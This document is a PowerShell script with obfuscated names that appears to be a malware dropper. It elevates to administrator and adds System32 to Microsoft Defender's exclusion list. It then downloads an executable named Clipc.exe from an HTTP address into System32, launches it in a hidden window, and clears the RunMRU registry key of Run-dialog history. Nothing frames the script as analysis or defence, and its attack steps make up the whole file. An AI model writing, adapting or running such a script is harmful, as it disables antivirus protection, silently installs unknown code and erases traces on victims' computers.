$nKJ78sd = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not ($nKJ78sd.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    $vbmX23 = Start-Process powershell -Verb RunAs -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`""
    exit
}

function f1 {
    param($p1)
    $tR5y = Get-Process -Name $p1 -ErrorAction 0
    if ($tR5y) {
        Stop-Process -Name $p1 -Force
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
    }
}

$wQ34 = "C:\Windows\System32"
$kP09 = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath -ErrorAction 0
if ($kP09 -eq $null) {
    Add-MpPreference -ExclusionPath $wQ34 | Out-Null
    Write-Output "[?] x12A4F: OK"
} elseif ($kP09 -notcontains $wQ34) {
    Add-MpPreference -ExclusionPath $wQ34 | Out-Null
    Write-Output "[?] y33B0F: OK"
}

$uL77 = "C:\Windows\System32\Clipc.exe"
$zX44 = "http://127.0.0.1:1234/Clipc.exe"

function f2 {
    try {
        $dWn3 = New-Object System.Net.WebClient
        $dWn3.DownloadFile($zX44, $uL77)
        Write-Output "[*] z88C2D: OK"
    } catch {
        Write-Output "[!] ERROR: e45T6R"
        exit (Get-Random -Minimum 1 -Maximum 10)
    }
}

if (Test-Path $uL77) {
    f1 -p1 "Clipc"
} else {
    Write-Output "[*] f09G7H: Missing"
}

f2

Start-Sleep -Seconds 1
if (Test-Path $uL77) {
    Start-Process -FilePath $uL77 -WindowStyle Hidden
    Write-Output "[*] k22M1N: Running"
}

$rT55 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path $rT55) {
    Remove-ItemProperty -Path $rT55 -Name "*" -ErrorAction 0 | Out-Null
    Remove-ItemProperty -Path $rT55 -Name "MRUList" -ErrorAction 0 | Out-Null
    Write-Output "[*] p77Q3Z: Cleaned"
}

Write-Output "[*] s99R4X: Done"
